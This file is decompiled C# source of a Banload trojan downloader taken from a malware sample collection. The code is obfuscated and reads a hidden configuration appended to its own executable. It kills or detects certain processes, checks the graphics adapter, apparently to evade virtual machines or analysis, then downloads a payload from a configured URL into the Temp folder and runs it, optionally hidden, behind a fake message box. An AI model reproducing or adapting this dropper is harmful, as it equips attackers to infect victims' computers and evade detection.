// Decompiled with JetBrains decompiler
// Type: ?1?.?9?
// Assembly: DownloaderStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BE8EE06-B99F-4C84-9085-2F256E8AF7BF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-Downloader.MSIL.Banload.w-f40bc2b8ff9aeb80890cf5cfa56f30878121771fccbbfa0d7d4aeeb95dece24b.exe

using \u003F1\u003F;
using \u003F1\u003F.\u003F2\u003F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Compatibility.VB6;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Diagnostics;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace \u003F1\u003F
{
  [StandardModule]
  internal sealed class \u003F9\u003F
  {
    private static string filename = Conversions.ToString(\u003F9\u003F.\u003F23\u003F(1000, 99999));
    private static object Devices;
    private static string Grafikadapter;
    private static string RegionA = \u003F34\u003F.\u003F35\u003F("pŧɭͥќՊؽܶ࠻ड़ੋୗౚശโཽၽᄡሣፏᑙᕧᙩᝩᡤ᥉ᩦ᭦ᱳᵴṪὨ\u206FⅧ≳");
    private static string URL;
    private static int s;

    private static object \u003F16\u003F(string _param0)
    {
      int num1;
      int lErl;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        Process[] processesByName = Process.GetProcessesByName(_param0);
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
label_3:
        lErl = 3;
        goto label_9;
label_4:
        num2 = -1;
        switch (num1)
        {
          case 2:
            goto label_3;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex, lErl);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    private static object \u003F17\u003F(string _param0)
    {
      int num1;
      int lErl;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        Process[] processesByName = Process.GetProcessesByName(_param0);
        int index = 0;
        while (index < processesByName.Length)
        {
          Process process = processesByName[index];
          \u003F9\u003F.s = 1;
          checked { ++index; }
        }
label_3:
        lErl = 4;
        goto label_9;
label_4:
        num2 = -1;
        switch (num1)
        {
          case 2:
            goto label_3;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex, lErl);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    private static void \u003F18\u003F()
    {
      \u003F9\u003F.\u003F25\u003F();
      if (Operators.CompareString(\u003F9\u003F.Grafikadapter, \u003F34\u003F.\u003F35\u003F("MųɫͬѢշٹݖ\u087C४\u0A31ୗ\u0C7D൯\u0E7Dཤၢᅩቺጨᑆᕢᙤ\u1774ᡷᥧᩳ"), false) != 0)
        return;
      \u003F9\u003F.s = 1;
    }

    private static void \u003F19\u003F()
    {
      \u003F9\u003F.\u003F25\u003F();
      if (Operators.CompareString(\u003F9\u003F.Grafikadapter, \u003F34\u003F.\u003F35\u003F("XŀɻͪѸլبݔࡐू\u0A45ଣోൈ"), false) != 0)
        return;
      \u003F9\u003F.s = 1;
    }

    private static void \u003F20\u003F()
    {
      \u003F9\u003F.\u003F25\u003F();
      if (Operators.CompareString(\u003F9\u003F.Grafikadapter, \u003F34\u003F.\u003F35\u003F("Oŕȷ͗ѱհٺݦ\u0878ॿ\u0A61\u0B7Dభൟุ\u0F2Aၝᅺቮ\u1369ᐶᔶᘬ᜴ᠵ"), false) != 0)
        return;
      \u003F9\u003F.s = 1;
    }

    [STAThread]
    public static void \u003F21\u003F()
    {
      int num1;
      int lErl;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        string str1 = Conversions.ToString(\u003F9\u003F.\u003F23\u003F(1000, 99999));
        if (System.IO.File.Exists(\u003F5\u003F.Computer.FileSystem.SpecialDirectories.Temp + \u003F34\u003F.\u003F35\u003F("]") + str1 + \u003F34\u003F.\u003F35\u003F("*Ŧɺͤ")))
          FileSystem.Kill(\u003F5\u003F.Computer.FileSystem.SpecialDirectories.Temp + \u003F34\u003F.\u003F35\u003F("]") + str1 + \u003F34\u003F.\u003F35\u003F("*Ŧɺͤ"));
        string str2 = \u003F5\u003F.Computer.FileSystem.SpecialDirectories.Temp + \u003F34\u003F.\u003F35\u003F("]") + str1 + \u003F34\u003F.\u003F35\u003F("*Ŧɺͤ");
        if (!System.IO.File.Exists(str2))
          System.IO.File.Copy(Application.ExecutablePath, str2);
        FixedLengthString fixedLengthString1 = new FixedLengthString(200);
        FileSystem.FileOpen(1, str2, OpenMode.Binary);
        FixedLengthString fixedLengthString2 = fixedLengthString1;
        string str3 = fixedLengthString2.Value;
        FileSystem.FileGet(1, ref str3, checked (FileSystem.LOF(1) - 199L));
        fixedLengthString2.Value = str3;
        FileSystem.FileClose(1);
        char ch = '#';
        string[] strArray = \u003F9\u003F.\u003F24\u003F(fixedLengthString1.Value).Split(ch);
        \u003F9\u003F.URL = strArray[0];
        if (Operators.CompareString(strArray[1], \u003F34\u003F.\u003F35\u003F("Pűɷͤ"), false) == 0)
          \u003F9\u003F.\u003F16\u003F(\u003F34\u003F.\u003F35\u003F("Gūɱ͡ѫղ"));
        if (\u003F9\u003F.s != 1)
        {
          if (Operators.CompareString(strArray[2], \u003F34\u003F.\u003F35\u003F("Pűɷͤ"), false) == 0)
            \u003F9\u003F.\u003F18\u003F();
          if (\u003F9\u003F.s != 1)
          {
            if (Operators.CompareString(strArray[3], \u003F34\u003F.\u003F35\u003F("Pűɷͤ"), false) == 0)
              \u003F9\u003F.\u003F19\u003F();
            if (\u003F9\u003F.s != 1)
            {
              if (Operators.CompareString(strArray[4], \u003F34\u003F.\u003F35\u003F("Pűɷͤ"), false) == 0)
                \u003F9\u003F.\u003F20\u003F();
              if (\u003F9\u003F.s != 1)
              {
                if (Operators.CompareString(strArray[5], \u003F34\u003F.\u003F35\u003F("Pűɷͤ"), false) == 0)
                  \u003F9\u003F.\u003F16\u003F(\u003F34\u003F.\u003F35\u003F("bŴɱ"));
                if (\u003F9\u003F.s != 1)
                {
                  if (Operators.CompareString(strArray[6], \u003F34\u003F.\u003F35\u003F("Pűɷͤ"), false) == 0)
                    \u003F9\u003F.\u003F17\u003F(\u003F34\u003F.\u003F35\u003F("~šɵͣѶլ٢ݰ\u086A"));
                  if (\u003F9\u003F.s != 1)
                  {
                    \u003F9\u003F.\u003F22\u003F();
                    if (Conversions.ToBoolean(strArray[11]))
                      Interaction.Shell(\u003F5\u003F.Computer.FileSystem.SpecialDirectories.Temp + \u003F34\u003F.\u003F35\u003F("]") + \u003F9\u003F.filename + \u003F34\u003F.\u003F35\u003F("*Ŧɺͤ"), AppWinStyle.Hide);
                    else if (Operators.CompareString(strArray[11], \u003F34\u003F.\u003F35\u003F("CťɯͱѤ"), false) == 0)
                      Interaction.Shell(\u003F5\u003F.Computer.FileSystem.SpecialDirectories.Temp + \u003F34\u003F.\u003F35\u003F("]") + \u003F9\u003F.filename + \u003F34\u003F.\u003F35\u003F("*Ŧɺͤ"), AppWinStyle.NormalFocus);
                    if (Operators.CompareString(strArray[7], \u003F34\u003F.\u003F35\u003F("Pűɷͤ"), false) == 0 && Conversions.ToDouble(strArray[8]) != 0.0)
                    {
                      if (Conversions.ToDouble(strArray[8]) == 1.0)
                      {
                        int num3 = (int) MessageBox.Show(strArray[10], strArray[9], MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                      }
                      if (Conversions.ToDouble(strArray[8]) == 2.0)
                      {
                        int num4 = (int) MessageBox.Show(strArray[10], strArray[9], MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                      }
                      if (Conversions.ToDouble(strArray[8]) == 3.0)
                      {
                        int num5 = (int) MessageBox.Show(strArray[10], strArray[9], MessageBoxButtons.OK, MessageBoxIcon.Hand);
                      }
                    }
                  }
                }
              }
            }
          }
        }
label_33:
        lErl = 2;
        goto label_39;
label_34:
        num2 = -1;
        switch (num1)
        {
          case 2:
            goto label_33;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex, lErl);
        goto label_34;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_39:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void \u003F22\u003F() => new WebClient().DownloadFile(\u003F9\u003F.URL, \u003F5\u003F.Computer.FileSystem.SpecialDirectories.Temp + \u003F34\u003F.\u003F35\u003F("]") + \u003F9\u003F.filename + \u003F34\u003F.\u003F35\u003F("*Ŧɺͤ"));

    private static int \u003F23\u003F(int _param0, int _param1) => new Random().Next(_param0, _param1);

    public static string \u003F24\u003F(string _param0)
    {
      string String1 = \u003F34\u003F.\u003F35\u003F("NŒɍ̫щՍٍܹࡀॏੌ\u0B4Aఽൊผ\u0F6Fၯᅯቯ\u136FᑯᕯᙯᝯᡯᤴᨶᬰᰶᴴḶἨ…ℤ∦⌠␦┤☦✨⠶⤴⨶⬰ⰶⴴ⸶⽈うㅄ㉆㌕㐖㔔㙆㝶㡴㥶㩰㭶㱴㵶㹸㽦䁤䅦䉠䍦䑤䕦䙸䝶䡴䥶䩰䭶䱴䵶乸但偄冢劽厩咩嗙囙埕壕姑嫑寁峁巅廅忙惗懖拐揫擫旫曫柣棣槝檲殤泘涤");
      string str = \u003F34\u003F.\u003F35\u003F("Nǒˍ̫щՍٍܹࡀॏੌ\u0B4Aఽൊผ\u0F6Fၯᇯዯ\u136FᑯᕯᙯᝯᡯᦕᨶᮒᰶᶓẓἨ…\u2189∦⌠␦┤⚍➕⢕⤴⪐\u2B96Ⲕ\u2D98⸶⽈ュ㇡㉆㌕㐖㔔㙆㝶㣖㧔㫖㯐㱴㵶㹸㿋䁤䅦䋉䍦䑤䗱䚞䝶䡴䦂䩰䯹䱴䵶乸侺偄儢刽匩吩啸噻坲塰奼婺孼屢嵣幣彻恻慵扵捉摉敍晍李桊楊橔歐汗浘");
      long num = (long) Strings.Len(_param0);
      long Start1 = 1;
      object Left;
      while (Start1 <= num)
      {
        long Start2 = (long) Strings.InStr(String1, Strings.Mid(_param0, checked ((int) Start1), 1));
        if (Start2 <= 0L)
          Left = Operators.AddObject(Left, (object) Strings.Mid(_param0, checked ((int) Start1), 1));
        else
          goto label_5;
label_3:
        checked { ++Start1; }
        continue;
label_5:
        object Right = (object) Strings.Mid(str, checked ((int) Start2), 1);
        Left = Operators.AddObject(Left, Right);
        goto label_3;
      }
      return Conversions.ToString(Left);
    }

    private static void \u003F25\u003F()
    {
      object Instance = Interaction.GetObject(\u003F34\u003F.\u003F35\u003F("~šɩͫѢթٷݱ࠻"));
      string MemberName = \u003F34\u003F.\u003F35\u003F("LŰɢͥєձ٦ݰ\u0878");
      object[] objArray = new object[1]
      {
        (object) \u003F9\u003F.RegionA
      };
      object[] Arguments = objArray;
      bool[] flagArray = new bool[1]{ true };
      bool[] CopyBack = flagArray;
      object obj = NewLateBinding.LateGet(Instance, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack);
      if (flagArray[0])
        \u003F9\u003F.RegionA = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
      \u003F9\u003F.Devices = RuntimeHelpers.GetObjectValue(obj);
      IEnumerator enumerator;
      try
      {
        enumerator = ((IEnumerable) \u003F9\u003F.Devices).GetEnumerator();
        while (enumerator.MoveNext())
          \u003F9\u003F.Grafikadapter = Conversions.ToString(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(enumerator.Current), (System.Type) null, \u003F34\u003F.\u003F35\u003F("Oůɺͫѵկٵݰ\u086A७੯"), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
      }
      finally
      {
        if (enumerator is IDisposable _)
          (enumerator as IDisposable).Dispose();
      }
    }
  }
}
